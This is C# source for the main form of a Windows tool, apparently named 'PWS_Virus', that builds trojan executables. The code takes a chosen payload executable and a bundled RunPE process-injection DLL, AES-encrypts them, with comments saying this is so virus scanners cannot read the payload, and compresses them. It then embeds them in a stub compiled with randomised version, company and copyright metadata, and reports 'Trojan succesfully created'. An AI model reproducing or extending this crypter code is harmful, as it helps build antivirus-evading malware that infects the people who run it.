using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PWS_Virus
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            //set the radiobutton state for native storage to checked
            rbnNative.Checked = true;
        }

        #region "Form Functions"

        /// <summary>
        /// Select a file to be loaded into the trojan horse
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnPayload_Click(object sender, EventArgs e)
        {
            //Create an dialog to select an executable file and set the base directory to desktop
            OpenFileDialog ofd = new OpenFileDialog()
            {
                Filter = "Executable Files|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Title = "Select Payload"
            };

            //if a file location has been selected display it in the textbox
            if (ofd.ShowDialog() == DialogResult.OK)
                tbPayload.Text = ofd.FileName;
        }

        /// <summary>
        /// Select an icon for the trojan horse
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnIcon_Click(object sender, EventArgs e)
        {
            //Create an dialog to select a .ico file and set the base directory to desktop
            OpenFileDialog ofd = new OpenFileDialog()
            {
                Filter = "Icon Files|*.ico",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Title = "Select Icon"
            };

            //if a file location has been selected display it in the textbox
            if (ofd.ShowDialog() == DialogResult.OK)
                tbIcon.Text = ofd.FileName;
        }

        /// <summary>
        /// Generate a random encryption key
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnKey_Click(object sender, EventArgs e)
        {
            string temp = "";
            string charpool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJEKLMOPQRSTUVWXYZ";
            Random rand = new Random();
            for (int i = 0; i < 21; i++)
            {
                temp += charpool[rand.Next(0, charpool.Length)].ToString();
            }
            tbKey.Text = temp;
        }

        /// <summary>
        /// Outputs an executable file containing the payload
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnCreate_Click(object sender, EventArgs e)
        {
            //If there is no payload display an error message
            if (tbPayload.Text == "")
            {
                MessageBox.Show("Please select a file!", "No Payload", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            if(!File.Exists(tbPayload.Text))
            {
                MessageBox.Show("Selected file is invalid!", "Invalid Payload", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            //select a file location to output the executable
            SaveFileDialog sfd = new SaveFileDialog()
            {
                Filter = "Executable Files|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Title = "Select saving destination"
            };

            //if no location has been selected, cancel
            if (sfd.ShowDialog() != DialogResult.OK)
                return;

            //create a name for the .resources
            string res = Guid.NewGuid().ToString().Replace("-", "");
            //create names for the resources
            string injResName = "inj" + Guid.NewGuid().ToString().Replace("-", "");
            string payloadResName = "pay" + Guid.NewGuid().ToString().Replace("-", "");

            //get all bytes from the payload file
            byte[] Payload = File.ReadAllBytes(tbPayload.Text);
            //get all the bytes from the RunPE dll (allows for memory editing and migrating to other processes)
            byte[] injBytes = PWS_Virus.Properties.Resources.RunpeResource;

            //create an encryption key if one hasnt already been made (shorthand if statement)
            string encKey = "enc" + ((tbKey.Text == "") ? Guid.NewGuid().ToString().Replace("-", "") : tbKey.Text);

            //Encrypt the bytes so a virusscanner cant read out the payload
            Payload = _Encrypt(Payload, encKey);
            injBytes = _Encrypt(injBytes, encKey);

            //compress the bytes to save space
            Payload = Compress(Payload);
            injBytes = Compress(injBytes);

            //get the trojan horse code from our own resources
            string stubCode = PWS_Virus.Properties.Resources.stub;

            //Replace all the to be replaced placeholders
            //Determine whether to paste in the managed or native method (shorthand)
            stubCode = stubCode.Replace("[resextractfunction]", 
                (rbnNative.Checked ? PWS_Virus.Properties.Resources.funcNative : PWS_Virus.Properties.Resources.funcManaged));
            //Resource file name
            stubCode = stubCode.Replace("[resname]", res);
            //resource names
            stubCode = stubCode.Replace("[injres]", injResName);
            stubCode = stubCode.Replace("[payloadres]", payloadResName);
            //encryption key
            stubCode = stubCode.Replace("[enckey]", encKey);
            //assembly information
            stubCode = stubCode.Replace("[title]", "name" + Guid.NewGuid().ToString().Replace("-", ""));
            Random rand = new Random(); //generate random version numbers in 0.0.0.0 format
            stubCode = stubCode.Replace("[version]", String.Format("{0}.{1}.{2}.{3}", rand.Next(1, 99), rand.Next(99), rand.Next(99), rand.Next(99)));
            stubCode = stubCode.Replace("[fileversion]", String.Format("{0}.{1}.{2}.{3}", rand.Next(1, 99), rand.Next(99), rand.Next(99), rand.Next(99)));
            stubCode = stubCode.Replace("[desc]", "description" + Guid.NewGuid().ToString().Replace("-", ""));
            stubCode = stubCode.Replace("[company]", "company" + Guid.NewGuid().ToString().Replace("-", ""));
            stubCode = stubCode.Replace("[product]", "product" + Guid.NewGuid().ToString().Replace("-", ""));
            stubCode = stubCode.Replace("[copyright]", Guid.NewGuid().ToString().Replace("-", "") + " © 2000");
            stubCode = stubCode.Replace("[trademark]", Guid.NewGuid().ToString().Replace("-", "") + "™");
            
            bool result = false;
            //if the user selected native storage
            if (rbnNative.Checked)
            {
                //Compile without resources
                if (File.Exists(tbIcon.Text))
                    result = Compiler.CompileFromSource(stubCode, sfd.FileName, tbIcon.Text);
                else
                    // Compile without an icon.
                    result = Compiler.CompileFromSource(stubCode, sfd.FileName);

                //write the resources natively to the outputted file
                Writer.WriteResource(sfd.FileName, injBytes, injResName);
                Writer.WriteResource(sfd.FileName, Payload, payloadResName);
            }
            else if (rbnManaged.Checked)
            {
                //create a directory in which to temporarily save the .resources file
                string dropDir = Path.Combine(Environment.CurrentDirectory, "Temp"); ;
                string encRes = Path.Combine(dropDir, res + ".resources");
                if (!Directory.Exists(dropDir))
                    Directory.CreateDirectory(dropDir);

                //write the resources to that file (encRes) 
                using (ResourceWriter Writer = new ResourceWriter(encRes))
                {
                    //Add the resources to the resource file
                    Writer.AddResource(injResName, injBytes);
                    Writer.AddResource(payloadResName, Payload);
                    //Generate the resource file.
                    Writer.Generate();
                }

                //Compile using the .resources file located at encRes
                if (File.Exists(tbIcon.Text))
                    result = Compiler.CompileFromSource(stubCode, sfd.FileName, tbIcon.Text, new string[] { encRes });
                else
                    // Compile without an icon.
                    result = Compiler.CompileFromSource(stubCode, sfd.FileName, null, new string[] { encRes });
                //Delete the resources directory
                Directory.Delete(dropDir, true);
            }
            //If all went well show the user a message or if the opposite happened
            if (result)
                MessageBox.Show("Trojan succesfully created", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            else
                MessageBox.Show("Trojan not been created", "Failure", MessageBoxButtons.OK, MessageBoxIcon.Warning);

        }
        #endregion

        /// <summary>
        /// Encrypts and returns a byte array
        /// </summary>
        /// <param name="Payload">Bytes to be encrypted</param>
        /// <param name="_key">Encryption key to be used</param>
        /// <returns></returns>
        private static byte[] _Encrypt(byte[] Payload, string _key)
        {
            try
            {
                //create an instance to get the key with an added salt
                PasswordDeriveBytes pdb = new PasswordDeriveBytes(_key, Encoding.UTF8.GetBytes("4816382"));
                MemoryStream ms = new MemoryStream();
                Aes aes = new AesManaged();
                aes.Key = pdb.GetBytes(aes.KeySize / 8);
                aes.IV = pdb.GetBytes(aes.BlockSize / 8);
                CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
                cs.Write(Payload, 0, Payload.Length);
                cs.Close();
                return ms.ToArray();
            }
            catch
            {
                //if errors occured escape and return an empty byte array
                Environment.Exit(0);
                return new byte[] { };
            }
        }

        /// <summary>
        /// Compresses and returns a byte array
        /// </summary>
        /// <param name="b">Byte array to be compressed</param>
        /// <returns></returns>
        private static byte[] Compress(byte[] b)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (DeflateStream ds = new DeflateStream(ms, CompressionMode.Compress))
                {
                    ds.Write(b, 0, b.Length);
                }
                return ms.ToArray();
            }
        }
    }
}
